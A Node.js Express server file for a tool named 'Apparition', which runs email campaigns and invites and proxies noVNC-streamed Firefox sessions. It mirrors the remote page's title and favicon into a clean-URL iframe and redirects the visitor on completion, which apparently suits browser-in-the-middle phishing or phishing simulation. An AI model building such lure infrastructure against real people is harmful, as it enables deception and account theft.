'use strict';
require('dotenv').config();
const http    = require('http');
const https   = require('https');
const fs      = require('fs');
const net     = require('net');
const express = require('express');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const httpProxy    = require('http-proxy');
const path = require('path');

const { initDb, getDb }   = require('./models/init-db');
const { startCleanupJob } = require('./services/cleanup');

const adminAuthRoutes = require('./routes/adminAuth');
const campaignRoutes  = require('./routes/campaigns');
const inviteRoutes    = require('./routes/invites');
const emailRoutes     = require('./routes/email');
const sessionRoutes   = require('./routes/sessions');
const publicRoutes    = require('./routes/public');
const settingsRoutes  = require('./routes/settings');

const app  = express();
const PORT = process.env.PORT || 3000;

// ── SSL config (optional) ─────────────────────────────────────────────────────
const SSL_KEY  = process.env.SSL_KEY;
const SSL_CERT = process.env.SSL_CERT;
const useSSL   = !!(SSL_KEY && SSL_CERT);

// ── Trust proxy (correct req.ip behind nginx/Cloudflare) ─────────────────────
app.set('trust proxy', 1);

// ── View engine ───────────────────────────────────────────────────────────────
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, '../views'));

// ── Static assets ─────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, '../public')));

// ── Body parsing ──────────────────────────────────────────────────────────────
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());

// ── Session (admin UI only) ───────────────────────────────────────────────────
if (!process.env.SESSION_SECRET) {
  console.error('FATAL: SESSION_SECRET environment variable is not set');
  process.exit(1);
}
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure:   useSSL || process.env.COOKIE_SECURE === 'true',
    sameSite: 'lax',
    maxAge:   8 * 60 * 60 * 1000,
  },
}));

// ── VNC proxy ─────────────────────────────────────────────────────────────────
// NoVNC containers bind ports on the HOST. NOVNC_HOST must be reachable from
// inside the app container (host.docker.internal on Linux via extra_hosts).
const NOVNC_INTERNAL_HOST = process.env.NOVNC_HOST || 'host.docker.internal';

const vncProxy = httpProxy.createProxyServer({});

vncProxy.on('error', (err, req, res) => {
  console.error('[vnc-proxy]', err.message);
  if (res && res.writeHead && !res.headersSent) {
    res.writeHead(502).end('VNC session unavailable');
  }
});

// In-memory title/favicon cache — updated by titlemon.sh inside each container.
const sessionInfo = new Map();

// Container POSTs the current Firefox window title and derived favicon URL.
app.post('/vnc/:sessionId/info', (req, res) => {
  const { title, faviconUrl } = req.body || {};
  if (title) sessionInfo.set(req.params.sessionId, { title, faviconUrl: faviconUrl || null });
  res.json({ ok: true });
});

// Viewer polls this to update the browser tab title and favicon.
app.get('/vnc/:sessionId/info', (req, res) => {
  res.json(sessionInfo.get(req.params.sessionId) || { title: null, faviconUrl: null });
});

// Status probe — returns whether the session has completed and where to redirect.
// Polled by the viewer wrapper page to trigger client-side redirect on completion.
app.get('/vnc/:sessionId/status', (req, res) => {
  const db  = getDb();
  const row = db.prepare(`
    SELECT s.completed_at, c.after_completion, c.redirect_url
    FROM sessions s
    JOIN invite_tokens it ON it.id = s.invite_token_id
    JOIN campaigns c ON c.id = it.campaign_id
    WHERE s.session_id = ?
  `).get(req.params.sessionId);
  db.close();

  if (!row) return res.json({ completed: false });
  const completed = row.completed_at !== null;
  res.json({ completed, redirectUrl: completed ? row.redirect_url : null });
});

// Readiness probe — TCP-connects to the container's noVNC port.
app.get('/vnc/:sessionId/ready', (req, res) => {
  const db  = getDb();
  const row = db.prepare(
    'SELECT container_port FROM sessions WHERE session_id = ? AND completed_at IS NULL'
  ).get(req.params.sessionId);
  db.close();

  if (!row) return res.json({ ready: false });

  const sock = new net.Socket();
  sock.setTimeout(1000);
  sock.on('connect', () => { sock.destroy(); res.json({ ready: true }); });
  sock.on('error',   () => res.json({ ready: false }));
  sock.on('timeout', () => { sock.destroy(); res.json({ ready: false }); });
  sock.connect(row.container_port, NOVNC_INTERNAL_HOST);
});

// Full HTTP proxy for noVNC — forwards /vnc/:sessionId/* → container's noVNC server.
// Express strips the mount prefix so req.url inside the handler is already the
// container-relative path (e.g. /vnc.html?...), which http-proxy appends to the target.
app.use('/vnc/:sessionId', (req, res) => {
  const db  = getDb();
  const row = db.prepare(
    'SELECT container_port FROM sessions WHERE session_id = ? AND completed_at IS NULL'
  ).get(req.params.sessionId);
  db.close();

  if (!row) {
    return res.status(404).render('error', {
      title: 'Session Not Found', message: 'This session has ended or does not exist.',
    });
  }

  vncProxy.web(req, res, { target: `http://${NOVNC_INTERNAL_HOST}:${row.container_port}` });
});

// ── Routes ────────────────────────────────────────────────────────────────────
app.use('/', publicRoutes);
app.use('/session', sessionRoutes);
app.use('/admin', adminAuthRoutes);
app.use('/admin/campaigns', campaignRoutes);
app.use('/admin/invites', inviteRoutes);
app.use('/admin/email', emailRoutes);
app.use('/admin/settings', settingsRoutes);
app.get('/', (req, res) => res.redirect('/admin/dashboard'));

// ── Clean viewer URL: /:slug/:shortId ─────────────────────────────────────────
// shortId = last 12 chars of the session UUID (after the final dash).
// Serves a full-screen iframe wrapper so the browser address bar shows the
// clean URL rather than the full noVNC URL with password in the query string.
app.get('/:slug/:shortId', (req, res) => {
  const { slug, shortId } = req.params;
  const db  = getDb();
  const row = db.prepare(`
    SELECT s.session_id, s.vnc_password, c.after_completion, c.redirect_url, c.favicon_url
    FROM sessions s
    JOIN invite_tokens it ON it.id = s.invite_token_id
    JOIN campaigns c ON c.id = it.campaign_id
    WHERE c.slug = ? AND s.session_id LIKE '%-' || ? AND s.completed_at IS NULL
    ORDER BY s.launched_at DESC LIMIT 1
  `).get(slug, shortId);
  db.close();

  if (!row) {
    return res.status(404).render('error', {
      title: 'Session Not Found', message: 'This session has ended or does not exist.',
    });
  }

  const { session_id, vnc_password, after_completion, redirect_url, favicon_url } = row;
  const vncSrc = `/vnc/${session_id}/vnc.html?autoconnect=1&resize=remote&path=${encodeURIComponent('/vnc/' + session_id + '/websockify')}${vnc_password ? '&password=' + encodeURIComponent(vnc_password) : ''}`;

  res.render('viewer', { sessionId: session_id, vncSrc, afterCompletion: after_completion, redirectUrl: redirect_url, faviconUrl: favicon_url || null });
});

// ── Global error handler ──────────────────────────────────────────────────────
app.use((err, req, res, _next) => {
  const status = err.status || 500;
  console.error(`[${status}] ${err.message}`);
  if (req.headers.accept && req.headers.accept.includes('application/json')) {
    return res.status(status).json({ error: err.message });
  }
  res.status(status).render('error', { title: `Error ${status}`, message: err.message });
});

// ── HTTP(S) server ────────────────────────────────────────────────────────────
const server = useSSL
  ? https.createServer({ key: fs.readFileSync(SSL_KEY), cert: fs.readFileSync(SSL_CERT) }, app)
  : http.createServer(app);

server.on('upgrade', (req, socket, head) => {
  console.log('[ws-upgrade] url:', req.url);
  // Match /vnc/:sessionId/websockify (noVNC's native WebSocket path)
  const match = req.url.match(/^\/vnc\/([^/]+)\/websockify(\?.*)?$/);
  if (!match) {
    console.log('[ws-upgrade] no match — destroying socket');
    return socket.destroy();
  }

  const db  = getDb();
  const row = db.prepare(
    'SELECT container_port FROM sessions WHERE session_id = ? AND completed_at IS NULL'
  ).get(match[1]);
  db.close();

  if (!row) {
    console.log('[ws-upgrade] session not found:', match[1]);
    return socket.destroy();
  }

  const target = `ws://${NOVNC_INTERNAL_HOST}:${row.container_port}`;
  console.log('[ws-upgrade] proxying to', target);
  req.url = '/websockify';
  vncProxy.ws(req, socket, head, { target }, (err) => {
    console.error('[vnc-ws-proxy]', err.message);
    socket.destroy();
  });
});

// ── Boot ──────────────────────────────────────────────────────────────────────
initDb();
startCleanupJob();

server.listen(PORT, () => {
  console.log(`Apparition running on ${useSSL ? 'HTTPS' : 'HTTP'} port ${PORT}`);
});

module.exports = app;
